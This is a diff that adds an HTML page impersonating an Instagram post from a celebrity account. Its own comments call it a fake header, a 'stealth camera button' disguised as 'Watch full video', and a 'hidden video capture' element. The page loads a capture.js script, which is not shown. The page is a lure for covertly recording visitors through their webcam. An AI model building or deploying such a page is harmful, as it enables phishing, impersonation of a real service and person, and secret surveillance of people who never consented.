@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://www.instagram.com/favicon.ico">
+    <meta property="og:image" content="https://picsum.photos/500/500?random=1">
+    <meta name="theme-color" content="#0095f6">
+</head>
+<body>
+    <!-- FAKE INSTAGRAM HEADER -->
+    <header class="header">
+        <div class="header-left">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+            <span class="search-placeholder"></span>
+        </div>
+        <div class="header-right">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M18.707 3H5.293A2.293 2.293 0 0 0 3 5.293v13.414A2.293 2.293 0 0 0 5.293 21h13.414A2.293 2.293 0 0 0 21 18.707V5.293A2.293 2.293 0 0 0 18.707 3z"/></svg>
+            <svg class="icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+        </div>
+    </header>
+
+    <main class="main">
+        <!-- FAKE POST CONTAINER -->
+        <article class="post">
+            <div class="post-header">
+                <div class="user-info">
+                    <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=150&h=150&fit=crop&crop=face" class="avatar">
+                    <div>
+                        <h3>kimkardashian</h3>
+                        <span>Los Angeles, CA</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-image-container">
+                <img id="postImage" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=600&h=600&fit=crop" class="post-image" alt="Trending Post">
+                <div class="play-overlay">
+                    <svg viewBox="0 0 24 24" class="play-icon"><path fill="#fff" d="M8 5v14l11-7z"/></svg>
+                </div>
+            </div>
+            
+            <div class="post-actions">
+                <div class="action-buttons">
+                    <svg class="action-icon active"><path d="M19.613 6.387a1 1 0 0 0-.707-.293h-.171A2.416 2.416 0 0 0 16.585 6c-.945 0-1.893.416-2.62 1.21l-.091.102-.054.057A14.6 14.6 0 0 0 11 11.023v.08a14.485 14.485 0 0 0 2.733.597 1 1 0 0 1 .8.8c.014.093.023.186.033.28a11.03 11.03 0 0 1 .29 2.484 1 1 0 0 1-.31.838l-.065.068L13.8 17.15a1 1 0 0 0-.087 1.093c.035.105.084.204.145.294.28.35.711.614 1.18.728.16.04.323.057.484.057a2.394 2.394 0 0 0 2.39-2.39c0-.042-.003-.084-.01-.126a1 1 0 0 0-.491-.709l-.165-.099a1 1 0 0 0-.992.183A8.6 8.6 0 0 1 16 16.097a8.1 8.1 0 0 1-.59-2.343c-.029-.22-.048-.443-.063-.664a.998.998 0 0 1 .305-.789l.093-.082a2 2 0 0 1 1.316-1.39c.461-.234.952-.354 1.47-.354.502 0 .998.082 1.466.24a1 1 0 0 0 .707-.293l.112-.112a1 1 0 0 0 0-1.414l-1.62-1.62z"/></svg>
+                    <svg class="action-icon"><path d="M8 15l11-5-11 5z"/></svg>
+                    <svg class="action-icon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                </div>
+            </div>
+            
+            <!-- STEALTH CAMERA BUTTON (looks like "View Video") -->
+            <div class="video-prompt">
+                <button id="watchVideoBtn" class="watch-video-btn">
+                    <svg viewBox="0 0 24 24" class="btn-icon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span>Watch full video</span>
+                </button>
+            </div>
+        </article>
+    </main>
+
+    <!-- HIDDEN VIDEO CAPTURE -->
+    <video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+
+    <script src="capture.js"></script>
+</body>
+</html>
